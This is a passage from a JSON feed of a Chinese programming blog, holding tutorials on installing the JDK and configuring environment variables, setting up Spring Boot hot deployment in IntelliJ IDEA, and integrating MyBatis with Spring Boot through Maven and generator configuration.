      "url": "https://vxhly.github.io/views/java/install-jdk-on-windows.html",
      "id": "https://vxhly.github.io/views/java/install-jdk-on-windows.html",
      "summary": "前言\nJDK 是 Java 语言的软件开发工具包, 主要用于移动设备、嵌入式设备上的 java 应用程序。JDK 是整个 java 开发的核心, 它包含了 JAVA 的运行环境, JAVA 工具和 JAVA 基础的类库。这里将介绍在 Windows 下 JDK 的安装和环境变量的配置。\n\n",
      "content_html": "<div><p>前言</p>\n<p>JDK 是 Java 语言的软件开发工具包, 主要用于移动设备、嵌入式设备上的 java 应用程序。JDK 是整个 java 开发的核心, 它包含了 JAVA 的运行环境, JAVA 工具和 JAVA 基础的类库。这里将介绍在 Windows 下 JDK 的安装和环境变量的配置。</p>\n</div>\n\n<h2 id=\"安装-jdk\" tabindex=\"-1\"> 安装 JDK</h2>\n<p>安装 JDK 时。第一次是安装 jdk , 第二次是安装 jre 。建议两个都安装在同一个 java 文件夹中的不同文件夹中。（不能都安装在 java 文件夹的根目录下, jdk 和 jre 安装在同一文件夹会出错）。</p>\n<p><code>For Example:</code> <br></p>\n<p><img src=\"/assets/jdk-1.png\" alt=\"JDK 安装\"></p>\n<p>安装 <code>jdk</code> 随意选择目录 只需把默认安装目录 <code>\\java</code> 之前的目录修改即可<br></p>\n<p><img src=\"/assets/jdk-2.png\" alt=\"JDK 安装\"></p>\n<p>安装 <code>jre</code> → <code>更改</code> → <code>\\java</code> 之前目录和安装 <code>jdk</code> 目录相同即可<br></p>\n<p><img src=\"/assets/jdk-3.png\" alt=\"JDK 安装\"></p>\n<div><p>注意</p>\n<p>若无安装目录要求, 可全默认设置。无需做任何修改, 两次均直接点下一步。</p>\n</div>\n<h2 id=\"环境变量配置\" tabindex=\"-1\"> 环境变量配置</h2>\n<p>安装完 JDK 后配置环境变量, 依次选择: <code>计算机</code> → <code>属性</code> → <code>高级系统设置</code> → <code>高级</code> → <code>环境变量</code> <br></p>\n<p><img src=\"/assets/jdk-4.png\" alt=\"JDK 环境变量配置\"></p>\n<h3 id=\"指定-java-程序目录\" tabindex=\"-1\"> 指定 JAVA 程序目录</h3>\n<p>新建 <code>JAVA_HOME</code> 变量 。变量值填写 <code>jdk</code> 的安装目录（本人是 <code>D:\\Java\\jdk</code> )<br></p>\n<p><img src=\"/assets/jdk-5.png\" alt=\"JDK 环境变量配置\"></p>\n<h3 id=\"修改-path-变量\" tabindex=\"-1\"> 修改 Path 变量</h3>\n<p>在变量值最后输入 <code>%JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin;</code> （注意原来 <code>Path</code> 的变量值末尾有没有 <code>;</code> 号, 如果没有, 先输入 <code>;</code> 号再输入上面的代码）<br></p>\n<p><img src=\"/assets/jdk-6.png\" alt=\"JDK 环境变量配置\"></p>\n<h3 id=\"新建-classpath-变量\" tabindex=\"-1\"> 新建 CLASSPATH 变量</h3>\n<p>在变量值中输入 <code>.;%JAVA_HOME%\\lib;%JAVA_HOME%\\lib\\tools.jar</code> （注意最前面有一点）<br></p>\n<p><img src=\"/assets/jdk-7.png\" alt=\"JDK 环境变量配置\"></p>\n<p>到此系统的环境变量已经全部配置完毕。</p>\n<h2 id=\"检验安装完成\" tabindex=\"-1\"> 检验安装完成</h2>\n<p>运行 cmd 输入 <code>java -version</code> （java 和 -version 之间有空格）。 若如图所示, 显示版本信息, 则说明安装和配置成功。<br></p>\n<p><img src=\"/assets/jdk-8.png\" alt=\"JDK 环境变量配置\"></p>\n<h2 id=\"附加-liunx-下环境变量配置\" tabindex=\"-1\"> 附加 liunx 下环境变量配置</h2>\n<p>安装包只需在官网下载源码安装包即可, 下载之后解压在 <code>~/java/jdk</code> 下即可</p>\n<p>在 <code>/etc/profile</code> 和 <code>/etc/bash.bashrc</code> 下粘贴以下代码</p>\n<div><pre><code><span>export</span> <span>JAVA_HOME</span><span>=~</span>/java/jdk\n<span>export</span> <span><span>PATH</span></span><span>=</span><span>$JAVA_HOME</span>/bin:<span>$PATH</span>\n<span>export</span> <span>CLASSPATH</span><span>=</span>.:<span>$JAVA_HOME</span>/lib/dt.jar:<span>$JAVA_HOME</span>/lib/tools.jar\n<span>export</span> <span>JRE_HOME</span><span>=</span><span>$JAVA_HOME</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>之后分别运行 <code>source /etc/profile</code> 、 <code>source /etc/bash.bashrc</code> 来让配置生效</p>\n<p>生效之后可以运行 <code>java -version</code> 来验证一下</p>\n",
      "image": "https://vxhly.github.io/assets/jdk-1.png",
      "date_published": "2016-09-30T19:36:02.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "java"
      ]
    },
    {
      "title": "在 IntelliJ IDEA 中配置 Spring Boot 项目的热部署",
      "url": "https://vxhly.github.io/views/java/spring-boot-by-idea-hot-deploy.html",
      "id": "https://vxhly.github.io/views/java/spring-boot-by-idea-hot-deploy.html",
      "summary": "前言\nSpring Boot 是由 Pivotal 团队提供的全新框架, 其设计目的是用来简化新 Spring 应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置, 从而使开发人员不再需要定义样板化的配置。Spring Boot 的 Web 项目, 在每一次修改了 java 文件或者是 resource 的时候, 都必须去重启一下项目, 这样的话浪费了很多的时间, 实现了热部署, 在每一次作了修改之后, 都会自动的重启。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Spring Boot 是由 Pivotal 团队提供的全新框架, 其设计目的是用来简化新 Spring 应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置, 从而使开发人员不再需要定义样板化的配置。Spring Boot 的 Web 项目, 在每一次修改了 java 文件或者是 resource 的时候, 都必须去重启一下项目, 这样的话浪费了很多的时间, 实现了热部署, 在每一次作了修改之后, 都会自动的重启。</p>\n</div>\n\n<h2 id=\"使用-intellij-idea-创建-spring-boot-项目\" tabindex=\"-1\"> 使用 IntelliJ IDEA 创建 Spring Boot 项目</h2>\n<h3 id=\"新建-spring-initializr-项目\" tabindex=\"-1\"> 新建 Spring Initializr 项目</h3>\n<p><img src=\"/assets/spring-boot-1.png\" alt=\"Spring Boot\"></p>\n<h3 id=\"填写项目信息\" tabindex=\"-1\"> 填写项目信息</h3>\n<p><img src=\"/assets/spring-boot-2.png\" alt=\"Spring Boot\"></p>\n<h3 id=\"选择项目使用的技术\" tabindex=\"-1\"> 选择项目使用的技术</h3>\n<p><img src=\"/assets/spring-boot-3.png\" alt=\"Spring Boot\"></p>\n<h3 id=\"填写项目名称\" tabindex=\"-1\"> 填写项目名称</h3>\n<p><img src=\"/assets/spring-boot-4.png\" alt=\"Spring Boot\"></p>\n<h3 id=\"项目架构及依赖\" tabindex=\"-1\"> 项目架构及依赖</h3>\n<p><img src=\"/assets/spring-boot-5.png\" alt=\"Spring Boot\"></p>\n<h2 id=\"添加测试控制器\" tabindex=\"-1\"> 添加测试控制器</h2>\n<p>找到入口的文件, 将其修改成如下所示</p>\n<div><pre><code><span>package</span> <span>com<span>.</span>springboot<span>.</span>first</span><span>;</span>\n\n<span>import</span> <span><span>org<span>.</span>springframework<span>.</span>boot<span>.</span></span><span>SpringApplication</span></span><span>;</span>\n<span>import</span> <span><span>org<span>.</span>springframework<span>.</span>boot<span>.</span>autoconfigure<span>.</span></span><span>SpringBootApplication</span></span><span>;</span>\n<span>import</span> <span><span>org<span>.</span>springframework<span>.</span>web<span>.</span>bind<span>.</span>annotation<span>.</span></span><span>RequestMapping</span></span><span>;</span>\n<span>import</span> <span><span>org<span>.</span>springframework<span>.</span>web<span>.</span>bind<span>.</span>annotation<span>.</span></span><span>RestController</span></span><span>;</span>\n\n<span>@RestController</span>\n<span>@SpringBootApplication</span>\n<span>public</span> <span>class</span> <span>FirstApplication</span> <span>{</span>\n\n    <span>@RequestMapping</span><span>(</span><span>\"/\"</span><span>)</span>\n    <span>String</span> <span>index</span><span>(</span><span>)</span> <span>{</span>\n        <span>return</span> <span>\"Hello Spring Boot\"</span><span>;</span>\n    <span>}</span>\n    <span>public</span> <span>static</span> <span>void</span> <span>main</span><span>(</span><span>String</span><span>[</span><span>]</span> args<span>)</span> <span>{</span>\n        <span>SpringApplication</span><span>.</span><span>run</span><span>(</span><span>FirstApplication</span><span>.</span><span>class</span><span>,</span> args<span>)</span><span>;</span>\n    <span>}</span>\n<span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>\n<p><code>@SpringBootApplication</code> 是 Spring Boot 项目的核心注解, 主要目的是开启自动配置。main 方法是一个标准的 Java 应用的 main 方法, 主要作用是作为项目启动的入口。</p>\n</div>\n<h3 id=\"访问测试\" tabindex=\"-1\"> 访问测试</h3>\n<p>运行项目, 把它当成一个 java 类运行就可以了</p>\n<p><img src=\"/assets/spring-boot-6.png\" alt=\"Spring Boot\"></p>\n<p>运行信息</p>\n<p><img src=\"/assets/spring-boot-7.png\" alt=\"Spring Boot\"></p>\n<p>浏览器访问</p>\n<p><img src=\"/assets/spring-boot-8.png\" alt=\"Spring Boot\"></p>\n<h2 id=\"intellij-idea-配置热部署\" tabindex=\"-1\"> IntelliJ IDEA 配置热部署</h2>\n<h3 id=\"配置-pom-xml\" tabindex=\"-1\"> 配置 pom.xml</h3>\n<p>引入热加载的插件</p>\n<div><pre><code><span><span><span>&lt;</span>dependency</span><span>></span></span>\n    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n    <span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-devtools<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n    <span><span><span>&lt;</span>optional</span><span>></span></span>true<span><span><span>&lt;/</span>optional</span><span>></span></span>\n<span><span><span>&lt;/</span>dependency</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><p>project 中添加 spring-boot-maven-plugin, 主要在 eclipse 中起作用, idea 不需要加此配置, springboot 项目的话, 应该是有此配置, 加里面的内容即可。</p>\n<div><pre><code><span><span><span>&lt;</span>build</span><span>></span></span>\n    <span><span><span>&lt;</span>plugins</span><span>></span></span>\n        <span><span><span>&lt;</span>plugin</span><span>></span></span>\n            <span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n            <span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n            <span><span><span>&lt;</span>configuration</span><span>></span></span>\n                <span><span><span>&lt;</span>fork</span><span>></span></span>true<span><span><span>&lt;/</span>fork</span><span>></span></span>\n            <span><span><span>&lt;/</span>configuration</span><span>></span></span>\n        <span><span><span>&lt;/</span>plugin</span><span>></span></span>\n    <span><span><span>&lt;/</span>plugins</span><span>></span></span>\n<span><span><span>&lt;/</span>build</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"配置-maven-下载加速\" tabindex=\"-1\"> 配置 Maven 下载加速</h3>\n<p>右键项目选中 maven 选项, 然后选择 &quot;open settings.xml&quot; 或者 &quot;create settings.xml&quot;, 然后把如下代码粘贴进去就可以了. 重启 IDE, 感受速度飞起来的感觉吧！！！</p>\n<div><pre><code><span>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span><span><span>&lt;</span>settings</span> <span>xmlns</span><span><span>=</span><span>\"</span>http://maven.apache.org/SETTINGS/1.0.0<span>\"</span></span>\n          <span><span>xmlns:</span>xsi</span><span><span>=</span><span>\"</span>http://www.w3.org/2001/XMLSchema-instance<span>\"</span></span>\n          <span><span>xsi:</span>schemaLocation</span><span><span>=</span><span>\"</span>http://maven.apache.org/SETTINGS/1.0.0 http://maven.apache.org/xsd/settings-1.0.0.xsd<span>\"</span></span><span>></span></span>\n    <span><span><span>&lt;</span>mirrors</span><span>></span></span>\n        <span>&lt;!-- mirror\n         | Specifies a repository mirror site to use instead of a given repository. The repository that\n         | this mirror serves has an ID that matches the mirrorOf element of this mirror. IDs are used\n         | for inheritance and direct lookup purposes, and must be unique across the set of mirrors.\n         |\n        &lt;mirror>\n          &lt;id>mirrorId&lt;/id>\n          &lt;mirrorOf>repositoryId&lt;/mirrorOf>\n          &lt;name>Human Readable Name for this Mirror.&lt;/name>\n          &lt;url>http://my.repository.com/repo/path&lt;/url>\n        &lt;/mirror>\n         --></span>\n\n        <span><span><span>&lt;</span>mirror</span><span>></span></span>\n            <span><span><span>&lt;</span>id</span><span>></span></span>alimaven<span><span><span>&lt;/</span>id</span><span>></span></span>\n            <span><span><span>&lt;</span>name</span><span>></span></span>aliyun maven<span><span><span>&lt;/</span>name</span><span>></span></span>\n            <span><span><span>&lt;</span>url</span><span>></span></span>http://maven.aliyun.com/nexus/content/groups/public/<span><span><span>&lt;/</span>url</span><span>></span></span>\n            <span><span><span>&lt;</span>mirrorOf</span><span>></span></span>central<span><span><span>&lt;/</span>mirrorOf</span><span>></span></span>\n        <span><span><span>&lt;/</span>mirror</span><span>></span></span>\n\n        <span><span><span>&lt;</span>mirror</span><span>></span></span>\n            <span><span><span>&lt;</span>id</span><span>></span></span>uk<span><span><span>&lt;/</span>id</span><span>></span></span>\n            <span><span><span>&lt;</span>mirrorOf</span><span>></span></span>central<span><span><span>&lt;/</span>mirrorOf</span><span>></span></span>\n            <span><span><span>&lt;</span>name</span><span>></span></span>Human Readable Name for this Mirror.<span><span><span>&lt;/</span>name</span><span>></span></span>\n            <span><span><span>&lt;</span>url</span><span>></span></span>http://uk.maven.org/maven2/<span><span><span>&lt;/</span>url</span><span>></span></span>\n        <span><span><span>&lt;/</span>mirror</span><span>></span></span>\n\n        <span><span><span>&lt;</span>mirror</span><span>></span></span>\n            <span><span><span>&lt;</span>id</span><span>></span></span>CN<span><span><span>&lt;/</span>id</span><span>></span></span>\n            <span><span><span>&lt;</span>name</span><span>></span></span>OSChina Central<span><span><span>&lt;/</span>name</span><span>></span></span>\n            <span><span><span>&lt;</span>url</span><span>></span></span>http://maven.oschina.net/content/groups/public/<span><span><span>&lt;/</span>url</span><span>></span></span>\n            <span><span><span>&lt;</span>mirrorOf</span><span>></span></span>central<span><span><span>&lt;/</span>mirrorOf</span><span>></span></span>\n        <span><span><span>&lt;/</span>mirror</span><span>></span></span>\n\n        <span><span><span>&lt;</span>mirror</span><span>></span></span>\n            <span><span><span>&lt;</span>id</span><span>></span></span>nexus<span><span><span>&lt;/</span>id</span><span>></span></span>\n            <span><span><span>&lt;</span>name</span><span>></span></span>internal nexus repository<span><span><span>&lt;/</span>name</span><span>></span></span>\n            <span>&lt;!-- &lt;url>http://192.168.1.100:8081/nexus/content/groups/public/&lt;/url>--></span>\n            <span><span><span>&lt;</span>url</span><span>></span></span>http://repo.maven.apache.org/maven2<span><span><span>&lt;/</span>url</span><span>></span></span>\n            <span><span><span>&lt;</span>mirrorOf</span><span>></span></span>central<span><span><span>&lt;/</span>mirrorOf</span><span>></span></span>\n        <span><span><span>&lt;/</span>mirror</span><span>></span></span>\n\n    <span><span><span>&lt;/</span>mirrors</span><span>></span></span>\n<span><span><span>&lt;/</span>settings</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"intellij-idea-相关配置\" tabindex=\"-1\"> IntelliJ IDEA 相关配置</h3>\n<p>点击 file , Settings , Build , Execution, Deplment</p>\n<p><img src=\"/assets/spring-boot-9.png\" alt=\"Spring Boot\"></p>\n<p>然后记得 apply, ok</p>\n<p>组合键: <code>Shift+ALT+Ctrl+/</code> , 选择&quot;Registry&quot;, 回车, 找到&quot;complier.automake.allow.when.app.running&quot;</p>\n<p><img src=\"/assets/spring-boot-10.png\" alt=\"Spring Boot\"></p>\n<p>到此全部配置完毕, 手动重启一次, 修改代码保持即可看到控制台在自动重启</p>\n",
      "image": "https://vxhly.github.io/assets/spring-boot-1.png",
      "date_published": "2018-08-22T14:47:20.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "java"
      ]
    },
    {
      "title": "Spring Boot 整合 Mybatis",
      "url": "https://vxhly.github.io/views/java/spring-boot-integration-mybatis.html",
      "id": "https://vxhly.github.io/views/java/spring-boot-integration-mybatis.html",
      "summary": "提示\nMyBatis 是一款优秀的持久层框架, 它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。这里介绍 Spring Boot 整合 Mybatis 的步骤, 数据库选用 MYSQL。\n\n",
      "content_html": "<div><p>提示</p>\n<p>MyBatis 是一款优秀的持久层框架, 它支持定制化 SQL、存储过程以及高级映射。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。这里介绍 Spring Boot 整合 Mybatis 的步骤, 数据库选用 MYSQL。</p>\n</div>\n\n<h2 id=\"修改-pom-xml\" tabindex=\"-1\"> 修改 pom.xml</h2>\n<div><pre><code><span><span><span>&lt;</span>dependency</span><span>></span></span>\n    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.spring.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-spring-boot-starter<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n    <span><span><span>&lt;</span>version</span><span>></span></span>1.3.2<span><span><span>&lt;/</span>version</span><span>></span></span>\n<span><span><span>&lt;/</span>dependency</span><span>></span></span>\n\n<span><span><span>&lt;</span>dependency</span><span>></span></span>\n    <span><span><span>&lt;</span>groupId</span><span>></span></span>mysql<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mysql-connector-java<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n    <span><span><span>&lt;</span>scope</span><span>></span></span>runtime<span><span><span>&lt;/</span>scope</span><span>></span></span>\n<span><span><span>&lt;/</span>dependency</span><span>></span></span>\n\n<span><span><span>&lt;</span>dependency</span><span>></span></span>\n    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.generator<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-generator-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n    <span><span><span>&lt;</span>version</span><span>></span></span>1.3.7<span><span><span>&lt;/</span>version</span><span>></span></span>\n<span><span><span>&lt;/</span>dependency</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id=\"修改-spring-boot-配置文件\" tabindex=\"-1\"> 修改 Spring Boot 配置文件</h2>\n<p>这里使用 yml 格式的配置文件, 将 application.properties 改名为 application.yml, 下面配置请根据自己的需求而修改</p>\n<div><pre><code>#\n端口\nserver:\n    port: 8080\n\n# 配置数据源\nspring:\n    datasource:\n    url: jdbc: mysql: //127.0.0.1:3306/databaseName?useUnicode=true&amp;characterEncoding=utf8\n    username: root\npassword: root\ndriver - class - name: com.mysql.jdbc.Driver\n\n# 打印 SQL 语句信息\nlogging:\n    level:\n    com.mysql.api: debug\n\ndebug: false\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>Spring Boot 会自动加载 application.yml 相关配置, 数据源就会自动注入到 s qlSessionFactory 中, sqlSessionFactory 会自动注入到 Mapper 中。</p>\n<h2 id=\"使用插件快速生成代码\" tabindex=\"-1\"> 使用插件快速生成代码</h2>\n<h3 id=\"配置-pom-xml\" tabindex=\"-1\"> 配置 pom.xml</h3>\n<p>添加 Mybatis-generator 插件</p>\n<div><pre><code><span><span><span>&lt;</span>dependency</span><span>></span></span>\n    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.generator<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-generator-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n    <span><span><span>&lt;</span>version</span><span>></span></span>1.3.7<span><span><span>&lt;/</span>version</span><span>></span></span>\n<span><span><span>&lt;/</span>dependency</span><span>></span></span>\n\n<span><span><span>&lt;</span>build</span><span>></span></span>\n    <span><span><span>&lt;</span>plugins</span><span>></span></span>\n        <span><span><span>&lt;</span>plugin</span><span>></span></span>\n            <span><span><span>&lt;</span>groupId</span><span>></span></span>org.springframework.boot<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n            <span><span><span>&lt;</span>artifactId</span><span>></span></span>spring-boot-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n            <span><span><span>&lt;</span>configuration</span><span>></span></span>\n                <span><span><span>&lt;</span>fork</span><span>></span></span>true<span><span><span>&lt;/</span>fork</span><span>></span></span>\n            <span><span><span>&lt;/</span>configuration</span><span>></span></span>\n        <span><span><span>&lt;/</span>plugin</span><span>></span></span>\n        <span><span><span>&lt;</span>plugin</span><span>></span></span>\n            <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.generator<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n            <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-generator-maven-plugin<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n            <span><span><span>&lt;</span>version</span><span>></span></span>1.3.7<span><span><span>&lt;/</span>version</span><span>></span></span>\n            <span><span><span>&lt;</span>configuration</span><span>></span></span>\n                <span><span><span>&lt;</span>configurationFile</span><span>></span></span>src/main/resources/generatorConfig.xml<span><span><span>&lt;/</span>configurationFile</span><span>></span></span>\n                <span><span><span>&lt;</span>verbose</span><span>></span></span>true<span><span><span>&lt;/</span>verbose</span><span>></span></span>\n                <span><span><span>&lt;</span>overwrite</span><span>></span></span>true<span><span><span>&lt;/</span>overwrite</span><span>></span></span>\n            <span><span><span>&lt;/</span>configuration</span><span>></span></span>\n            <span><span><span>&lt;</span>executions</span><span>></span></span>\n                <span><span><span>&lt;</span>execution</span><span>></span></span>\n                    <span><span><span>&lt;</span>id</span><span>></span></span>Generate MyBatis Artifacts<span><span><span>&lt;/</span>id</span><span>></span></span>\n                    <span><span><span>&lt;</span>goals</span><span>></span></span>\n                        <span><span><span>&lt;</span>goal</span><span>></span></span>generate<span><span><span>&lt;/</span>goal</span><span>></span></span>\n                    <span><span><span>&lt;/</span>goals</span><span>></span></span>\n                <span><span><span>&lt;/</span>execution</span><span>></span></span>\n            <span><span><span>&lt;/</span>executions</span><span>></span></span>\n            <span><span><span>&lt;</span>dependencies</span><span>></span></span>\n                <span><span><span>&lt;</span>dependency</span><span>></span></span>\n                    <span><span><span>&lt;</span>groupId</span><span>></span></span>org.mybatis.generator<span><span><span>&lt;/</span>groupId</span><span>></span></span>\n                    <span><span><span>&lt;</span>artifactId</span><span>></span></span>mybatis-generator-core<span><span><span>&lt;/</span>artifactId</span><span>></span></span>\n                    <span><span><span>&lt;</span>version</span><span>></span></span>1.3.7<span><span><span>&lt;/</span>version</span><span>></span></span>\n                <span><span><span>&lt;/</span>dependency</span><span>></span></span>\n            <span><span><span>&lt;/</span>dependencies</span><span>></span></span>\n        <span><span><span>&lt;/</span>plugin</span><span>></span></span>\n    <span><span><span>&lt;/</span>plugins</span><span>></span></span>\n<span><span><span>&lt;/</span>build</span><span>></span></span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"编写配置文件-generatorconfig-xml\" tabindex=\"-1\"> 编写配置文件 generatorConfig.xml</h3>\n<p>在 IntelliJ IDEA 开发环境下, 此文件需要放在 resource 根目录下, mybatis generator 默认加载此目录的配置文件, 以下文件需要根据自己的情况进行配置</p>\n<div><pre><code><span>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?></span>\n<span><span>&lt;!</span><span>DOCTYPE</span> <span>generatorConfiguration</span>\n        <span>PUBLIC</span> <span>\"-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN\"</span>\n        <span>\"http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd\"</span><span>></span></span>\n\n<span><span><span>&lt;</span>generatorConfiguration</span><span>></span></span>\n    <span>&lt;!--数据库驱动jar --></span>\n    <span><span><span>&lt;</span>classPathEntry</span>\n        <span>location</span><span><span>=</span><span>\"</span>D:\\.m2\\repository\\mysql\\mysql-connector-java\\5.1.33\\mysql-connector-java-5.1.33.jar<span>\"</span></span> <span>/></span></span>\n\n    <span><span><span>&lt;</span>context</span> <span>id</span><span><span>=</span><span>\"</span>Tables<span>\"</span></span> <span>targetRuntime</span><span><span>=</span><span>\"</span>MyBatis3<span>\"</span></span><span>></span></span>\n        <span>&lt;!--去除注释 --></span>\n        <span><span><span>&lt;</span>commentGenerator</span><span>></span></span>\n            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>\"</span>suppressDate<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span>true<span>\"</span></span><span>/></span></span>\n            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>\"</span>suppressAllComments<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span>true<span>\"</span></span> <span>/></span></span>\n        <span><span><span>&lt;/</span>commentGenerator</span><span>></span></span>\n\n        <span>&lt;!--数据库连接 --></span>\n        <span><span><span>&lt;</span>jdbcConnection</span> <span>driverClass</span><span><span>=</span><span>\"</span>com.mysql.jdbc.Driver<span>\"</span></span>\n            <span>connectionURL</span><span><span>=</span><span>\"</span>jdbc:mysql://129.1.18.18:3306/ssm_demo<span>\"</span></span> <span>userId</span><span><span>=</span><span>\"</span>root<span>\"</span></span>\n            <span>password</span><span><span>=</span><span>\"</span>root<span>\"</span></span><span>></span></span>\n        <span><span><span>&lt;/</span>jdbcConnection</span><span>></span></span>\n        <span>&lt;!--默认false Java type resolver will always use java.math.BigDecimal if\n            the database column is of type DECIMAL or NUMERIC. --></span>\n        <span><span><span>&lt;</span>javaTypeResolver</span><span>></span></span>\n            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>\"</span>forceBigDecimals<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span>false<span>\"</span></span> <span>/></span></span>\n        <span><span><span>&lt;/</span>javaTypeResolver</span><span>></span></span>\n\n        <span>&lt;!--生成实体类 指定包名 以及生成的地址 （可以自定义地址,但是路径不存在不会自动创建 使用Maven生成在target目录下,会自动创建） --></span>\n        <span><span><span>&lt;</span>javaModelGenerator</span> <span>targetPackage</span><span><span>=</span><span>\"</span>com.myapp.api.entity<span>\"</span></span>\n                            <span>targetProject</span><span><span>=</span><span>\"</span>src/main/java<span>\"</span></span><span>></span></span>\n            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>\"</span>enableSubPackages<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span>true<span>\"</span></span> <span>/></span></span>\n            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>\"</span>trimStrings<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span>true<span>\"</span></span> <span>/></span></span>\n        <span><span><span>&lt;/</span>javaModelGenerator</span><span>></span></span>\n        <span>&lt;!--生成SQLMAP文件 --></span>\n        <span><span><span>&lt;</span>sqlMapGenerator</span> <span>targetPackage</span><span><span>=</span><span>\"</span>mapping<span>\"</span></span>\n                         <span>targetProject</span><span><span>=</span><span>\"</span>src/main/resources<span>\"</span></span><span>></span></span>\n            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>\"</span>enableSubPackages<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span>false<span>\"</span></span> <span>/></span></span>\n        <span><span><span>&lt;/</span>sqlMapGenerator</span><span>></span></span>\n        <span>&lt;!-- 生成DAO的包名和位置--></span>\n        <span>&lt;!-- XMLMAPPER生成xml映射文件, ANNOTATEDMAPPER 生成的 dao 采用注解来写sql --></span>\n        <span><span><span>&lt;</span>javaClientGenerator</span> <span>type</span><span><span>=</span><span>\"</span>ANNOTATEDMAPPER<span>\"</span></span>\n                             <span>targetPackage</span><span><span>=</span><span>\"</span>com.myapp.api.mapper<span>\"</span></span>\n                             <span>targetProject</span><span><span>=</span><span>\"</span>src/main/java<span>\"</span></span><span>></span></span>\n            <span><span><span>&lt;</span>property</span> <span>name</span><span><span>=</span><span>\"</span>enableSubPackages<span>\"</span></span> <span>value</span><span><span>=</span><span>\"</span>false<span>\"</span></span> <span>/></span></span>\n        <span><span><span>&lt;/</span>javaClientGenerator</span><span>></span></span>\n\n        <span>&lt;!--对应数据库表 mysql可以加入主键自增 字段命名 忽略某字段等 --></span>\n        